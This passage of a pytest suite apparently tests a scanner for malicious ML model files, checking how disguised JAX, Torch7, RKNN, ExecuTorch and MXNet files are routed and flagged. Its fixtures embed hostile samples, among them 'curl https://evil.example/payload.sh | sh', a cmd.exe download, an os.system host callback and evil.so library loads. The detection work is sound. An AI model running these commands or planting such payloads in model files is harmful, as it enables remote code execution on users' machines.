                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize("foreign_owner", ["mxnet", "xgboost"])
def test_scan_file_large_foreign_json_does_not_compose_ambiguous_jax_analysis(
    tmp_path: Path,
    foreign_owner: str,
) -> None:
    model_path = tmp_path / f"large-{foreign_owner}.json"
    payload: dict[str, Any]
    if foreign_owner == "mxnet":
        payload = {
            "nodes": [{"op": "null", "name": "data"}],
            "arg_nodes": [0],
            "heads": [[0, 0, 0]],
        }
    else:
        payload = {"version": [1, 7, 4], "learner": {"gradient_booster": {}}}
    payload["padding"] = "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)
    model_path.write_text(json.dumps(payload), encoding="utf-8")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == foreign_owner
    assert result.success is True
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


@pytest.mark.parametrize("suffix", [".ckpt", ".pickle"])
def test_scan_file_routes_jax_json_on_pickle_owned_suffixes_through_json_analysis(tmp_path: Path, suffix: str) -> None:
    model_path = tmp_path / f"state{suffix}"
    model_path.write_text(
        json.dumps({"framework": "jax", "payload": "jax.experimental.host_callback.call(os.system, 'id')"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize("suffix", [".ckpt", ".pickle"])
def test_scan_file_accepts_benign_jax_json_on_pickle_owned_suffixes(tmp_path: Path, suffix: str) -> None:
    model_path = tmp_path / f"benign-state{suffix}"
    model_path.write_text(json.dumps({"framework": "jax", "weights": [1, 2, 3]}), encoding="utf-8")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert result.success is True
    assert not any(
        check.name in {"File Type Validation", "Format Validation"} and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_fails_closed_for_oversized_renamed_jax_json_and_does_not_cache_result(tmp_path: Path) -> None:
    model_path = tmp_path / "large-state.jpg"
    near_match_path = tmp_path / "large-ajax.jpg"
    padding = "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)
    model_path.write_text(
        json.dumps(
            {
                "padding": padding,
                "framework": "jax",
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )
    near_match_path.write_text(json.dumps({"padding": padding, "framework": "ajax"}), encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(model_path), config=config)
        second = scan_file(str(model_path), config=config)
        near_match_result = scan_file(str(near_match_path), config={"cache_scan_results": False})

        assert first.scanner_name == "jax_checkpoint"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert "jax_json_checkpoint_analysis_size_limit" in first.metadata["scan_outcome_reasons"]
        assert near_match_result.scanner_name == "unknown"
        assert near_match_result.success is True
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_renamed_jax_json_root_is_past_routing_budget(tmp_path: Path) -> None:
    model_path = tmp_path / "late-root.jpg"
    model_path.write_text(
        (" " * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 1)) + json.dumps({"framework": "jax"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "jax_json_checkpoint_analysis_size_limit" in result.metadata["scan_outcome_reasons"]


def test_scan_file_routes_raw_bin_without_zip_structure_to_pytorch_binary(tmp_path: Path) -> None:
    model_path = tmp_path / "weights.bin"
    model_path.write_bytes(b"\x00" * 128)

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.success is True


@pytest.mark.parametrize(
    ("payload", "supplemental_scanner"),
    [
        (b"RKNN\x01\x00\x00\x00payload" + b"\x7fELF" + b"\x00" * 128, "rknn"),
        (b"T7\x00\x00payload torch.FloatTensor nn.Sequential " + b"\x7fELF" + b"\x00" * 128, "torch7"),
        (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00" + b"\x7fELF" + b"\x00" * 128, "executorch"),
    ],
    ids=["rknn", "torch7", "executorch"],
)
def test_scan_file_preserves_bin_executable_detection_when_prefix_looks_like_other_format(
    tmp_path: Path,
    payload: bytes,
    supplemental_scanner: str,
) -> None:
    model_path = tmp_path / "weights.bin"
    model_path.write_bytes(payload)

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert file_detection.detect_file_format(str(model_path)) == "pytorch_binary"
    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == [supplemental_scanner]
    assert any("Linux executable" in issue.message for issue in result.issues)


def test_scan_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
        b"local lib = package.loadlib('/tmp/evil.so', 'run')\n"
        b"\x7fELF" + b"\x00" * 128
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["torch7"]
    assert any("Linux executable" in issue.message for issue in result.issues)
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    "selection_config",
    [
        {"exclude_scanners": ["pytorch_binary"]},
        {"scanners": ["torch7"]},
    ],
    ids=["pytorch-binary-excluded", "torch7-only"],
)
def test_scan_file_routes_malicious_torch7_bin_when_raw_scanner_is_suppressed(
    tmp_path: Path,
    selection_config: dict[str, list[str]],
) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_file(
        str(model_path),
        config={**selection_config, "cache_scan_results": False},
    )

    assert result.scanner_name == "torch7"
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_binary"
        for check in result.checks
    )
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_file_merges_rknn_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["rknn"]
    assert any(
        check.name == "RKNN Command and Network Indicator Correlation"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_file_merges_executorch_archive_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "program.bin"
    model_path.write_bytes(b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00")
    with zipfile.ZipFile(model_path, "a") as archive:
        archive.writestr("evil.py", "print('evil')")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == ["executorch"]
    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)


def test_preferred_scanner_does_not_route_generic_zip_bin_to_pickle(tmp_path: Path) -> None:
    model_path = tmp_path / "weights.bin"
    _create_misnamed_zip(model_path, {"metadata.txt": b"not a pickle"})

    assert core_module._select_preferred_scanner_id(str(model_path), "zip", ".bin") == "zip"


def test_scan_file_routes_misnamed_executorch_archive_by_content(tmp_path: Path) -> None:
    disguised_exec = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_exec,
        {
            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"1",
            "evil.py": b"print('evil')\n",
        },
    )

    result = scan_file(str(disguised_exec))

    assert result.scanner_name == "executorch"
    assert any(issue.rule_code == "S507" and "evil.py" in (issue.location or "") for issue in result.issues)
    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)


def test_scan_file_does_not_route_non_pytorch_zip_with_generic_pickle(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "weights.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "weights.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"1.0",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_does_not_route_near_match_executorch_zip_without_numeric_version(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "bytecode.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "bytecode.pkl": pickle.dumps({"weights": [1, 2, 3]}),
            "version": b"dev",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_does_not_route_generic_data_pickle_without_pytorch_metadata(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "data.jpg"
    _create_misnamed_zip(disguised_zip, {"data.pkl": pickle.dumps({"weights": [1, 2, 3]})})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"


def test_scan_file_routes_misnamed_torchserve_mar_by_content(tmp_path: Path) -> None:
    disguised_mar = tmp_path / "model.jpg"
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "model.pkl",
        }
    }
    _create_misnamed_zip(
        disguised_mar,
        {
            "MAR-INF/MANIFEST.json": json.dumps(manifest).encode("utf-8"),
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_mar))

    assert result.scanner_name == "torchserve_mar"
    assert any("model.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_keras_hdf5_by_header(tmp_path: Path) -> None:
    h5py = pytest.importorskip("h5py")

    disguised_h5 = tmp_path / "model.jpg"
    with h5py.File(disguised_h5, "w") as handle:
        handle.attrs["model_config"] = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "name": "test",
                    "layers": [{"class_name": "Lambda", "config": {"function": "lambda x: x * 2"}}],
                },
            }
        )
        handle.attrs["keras_version"] = "3.11.2"

    result = scan_file(str(disguised_h5))

    assert result.scanner_name == "keras_h5"
    assert any("CVE-2025-9905" in issue.message for issue in result.issues)


def test_scan_file_routes_oversized_renamed_safetensors_to_inconclusive_scan(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_safetensors = tmp_path / "weights.jpg"
    _write_sparse_oversized_safetensors_candidate(disguised_safetensors)
    monkeypatch.setattr(
        safetensors_scanner.SafeTensorsScanner,
        "calculate_file_hashes",
        lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before hashing"),
    )

    result = scan_file(str(disguised_safetensors), config={"cache_scan_results": False})

    assert result.scanner_name == "safetensors"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "safetensors_header_size_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    limit_check = next(check for check in result.checks if check.name == "Header Size Limit")
    assert limit_check.status == CheckStatus.FAILED
    assert limit_check.severity == IssueSeverity.INFO


def test_scan_top_level_oversized_renamed_safetensors_fails_before_hashing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_safetensors = tmp_path / "weights.jpg"
    _write_sparse_oversized_safetensors_candidate(disguised_safetensors)
    monkeypatch.setattr(
        safetensors_scanner.SafeTensorsScanner,
        "calculate_file_hashes",
        lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before scanner hashing"),
    )
    monkeypatch.setattr(
        core_module,
        "_calculate_file_hash",
        lambda _path: pytest.fail("oversized SafeTensors top-level inputs must fail before aggregate hashing"),
    )

    result = scan_model_directory_or_file(str(disguised_safetensors), cache_scan_results=False)

    assert result.success is False
    assert core_module.determine_exit_code(result) == 2
    assert "safetensors" in result.scanner_names
    assert any(check.name == "Header Size Limit" for check in result.checks)


@pytest.mark.parametrize(
    ("filename", "header_prefix"),
    [("overlap.jpg", b"{}"), ("overlap.safetensors", b"x")],
)
def test_tensorflow_inconclusive_safetensors_overlap_fails_closed_without_hashing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    header_prefix: bytes,
) -> None:
    payload = tmp_path / filename
    _write_tensorflow_overlap_safetensors_candidate(payload, header_prefix)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
        "max_safetensors_header_bytes": 16,
    }
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_VALIDATE_BYTES", 1)
    monkeypatch.setattr(
        core_module,
        "_calculate_file_hash",
        lambda _path: pytest.fail("bounded routing overlap must not trigger aggregate hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file",
        lambda _self, _path: pytest.fail("bounded routing overlap must not trigger cache-key hashing"),
    )
    monkeypatch.setattr(
        SecureFileHasher,
        "hash_file_with_stat",
        lambda _self, _path, _stat: pytest.fail("bounded routing overlap must not trigger cache validation hashing"),
    )

    assert file_detection.detect_file_format(str(payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
    assert file_detection.should_defer_safetensors_header_limit_hash(str(payload), 16)

    reset_cache_manager()
    try:
        direct = scan_file(str(payload), config=config)
        aggregate = scan_model_directory_or_file(
            str(payload),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            max_safetensors_header_bytes=16,
        )

        assert direct.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
        assert aggregate.success is False
        assert core_module.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
    disguised_gguf = create_mock_gguf(tmp_path / "model.payload")

    result = scan_file(str(disguised_gguf))

    assert result.scanner_name == "gguf"
    assert result.metadata["format"] == "gguf"


@pytest.mark.parametrize("filename", ["model.jpg", "model.json", "model.onnx", "payload.params", "payload-0000.params"])
def test_scan_file_routes_misnamed_mxnet_symbol_and_detects_custom_library(tmp_path: Path, filename: str) -> None:
    disguised_symbol = create_mock_mxnet_symbol(
        tmp_path / filename,
        custom_library="../../tmp/libevil.so",
    )

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert any(
        issue.message == "Suspicious library reference in MXNet graph attributes"
        and issue.details.get("attribute") == "library"
        for issue in result.issues
    )


def test_scan_file_routes_bom_prefixed_params_symbol_and_detects_custom_library(tmp_path: Path) -> None:
    disguised_symbol = tmp_path / "payload-0000.params"
    disguised_symbol.write_text(
        '\ufeff{"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_fails_closed_for_renamed_mxnet_shadowed_nodes(tmp_path: Path) -> None:
    disguised_symbol = tmp_path / "payload.jpg"
    disguised_symbol.write_text(
        '{"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[{"op":"null","name":"data"}]}',
        encoding="utf-8",
    )

    result = scan_file(str(disguised_symbol), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_duplicate_root_keys" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "MXNet Symbol JSON Analysis" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_fails_closed_for_renamed_oversized_mxnet_symbol_prefix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 128)
    disguised_symbol = tmp_path / "large.jpg"
    disguised_symbol.write_text(
        '{"nodes":[{"op":"Custom","name":"custom_loader"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
        + ("x" * 256)
        + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]


def test_scan_file_canonical_mxnet_symbol_bypasses_routing_value_budget(tmp_path: Path) -> None:
    symbol_path = tmp_path / "large-symbol.json"
    symbol_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(symbol_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_small_renamed_mxnet_value_budget_before_structure_fails_closed(tmp_path: Path) -> None:
    model_path = tmp_path / "padded.jpg"
    model_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert model_path.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_file_generic_json_value_budget_before_mxnet_structure_detects_library(tmp_path: Path) -> None:
    model_path = tmp_path / "model.json"
    model_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert model_path.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_fails_closed_for_post_budget_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    model_path = tmp_path / "config.json"
    model_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"nodes":[],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]


@pytest.mark.parametrize("filename", ["model.json", "model.jpg"])
def test_scan_file_mxnet_symbol_with_python_json_nonfinite_constant_detects_library(
    tmp_path: Path,
    filename: str,
) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"padding":NaN,"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_generic_json_hint_before_value_budget_resolves_later_mxnet_structure(tmp_path: Path) -> None:
    model_path = tmp_path / "model.json"
    model_path.write_text(
        '{"heads":[[0,0,0]],"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_generic_array_heads_before_value_budget_without_mxnet_structure_uses_existing_owner(
    tmp_path: Path,
) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":["classification"],"padding":[' + ",".join("0" for _ in range(5000)) + "]}",
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.scanner_name == "manifest"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_canonical_mxnet_symbol_preserves_xgboost_overlap_analysis(tmp_path: Path) -> None:
    symbol_path = tmp_path / "polyglot-symbol.json"
    symbol_path.write_text(
        '{"padding":['
        + ",".join("0" for _ in range(5000))
        + '],"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(symbol_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert "xgboost_mxnet_symbol_overlap" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


@pytest.mark.parametrize(
    "payload",
    [
        '{"nodes":[{"attrs":"' + ("x" * 129) + '","op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        '{"heads":[[0,0,0]],"padding":"' + ("x" * 129) + '","nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0]}',
    ],
)
def test_scan_file_fails_closed_for_bounded_mxnet_routing_ambiguity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    payload: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    disguised_symbol = tmp_path / "ambiguous.jpg"
    disguised_symbol.write_text(payload, encoding="utf-8")

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    check = next(check for check in result.checks if check.name == "MXNet Symbol Routing")
    assert "bounded JSON probe reached its limit" in check.message


def test_scan_file_inconclusive_mxnet_route_composes_jax_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "ambiguous-jax.jpg"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    assert any("Suspicious pattern in JSON checkpoint" in issue.message for issue in aggregate.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_inconclusive_mxnet_route_preserves_jax_incomplete_reason(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    nested_payload: dict[str, Any] = {"value": "safe"}
    for _ in range(2 * JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH):
        nested_payload = {"nested": nested_payload}
    model_path = tmp_path / "ambiguous-deep-jax.jpg"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": nested_payload,
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.metadata["scan_outcome_reasons"] == [
        "jax_metadata_traversal_depth_limit",
        "mxnet_symbol_routing_incomplete",
    ]
    assert any(check.name == "JSON Metadata Traversal Depth Limit" for check in result.checks)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_incomplete_mxnet_routing_is_exit2_and_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    disguised_symbol = tmp_path / "ambiguous.jpg"
    disguised_symbol.write_text(
        '{"nodes":[{"attrs":"' + ("x" * 129) + '","op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(disguised_symbol),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(disguised_symbol),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(disguised_symbol)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == "inconclusive"
            assert "mxnet_symbol_routing_incomplete" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert any(
                check.name == "MXNet Symbol Routing" and "bounded JSON probe reached its limit" in check.message
                for check in aggregate.checks
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_reuses_trusted_mxnet_content_route(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    disguised_symbol = create_mock_mxnet_symbol(tmp_path / "model.jpg")
    original_detect = file_detection.detect_mxnet_symbol_content_route
    calls = 0

    def count_detects(path: str | Path) -> str | None:
        nonlocal calls
        calls += 1
        return original_detect(path)

    monkeypatch.setattr(file_detection, "detect_mxnet_symbol_content_route", count_detects)

    result = scan_file(str(disguised_symbol))

    assert result.scanner_name == "mxnet"
    assert calls == 1


def test_scan_file_routes_conclusive_xgboost_json_before_mxnet_ambiguity(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "booster.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"padding":"' + ("x" * 256) + '"}}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_routes_xgboost_json_with_markers_after_mxnet_probe_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "delayed-booster.json"
    model_path.write_text(
        '{"padding":"' + ("x" * 256) + '","version":[1,7,4],'
        '"learner":{"gradient_booster":{},"malicious_code":"os.system()"}}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_fails_closed_for_xgboost_mxnet_json_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},"nodes":[{"op":"Custom","name":"load",'
        '"attrs":{"library":"../../tmp/libevil.so","padding":"'
        + ("x" * 256)
        + '"}}],'
        + '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


